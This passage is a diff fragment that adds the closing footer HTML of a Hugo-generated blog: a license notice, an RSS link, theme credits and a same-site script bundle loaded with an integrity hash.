+            <span>CC Attribution-NonCommercial 4.0 International License</span>
+            <span> <a href="https://jamvie.net/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://jamvie.net/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
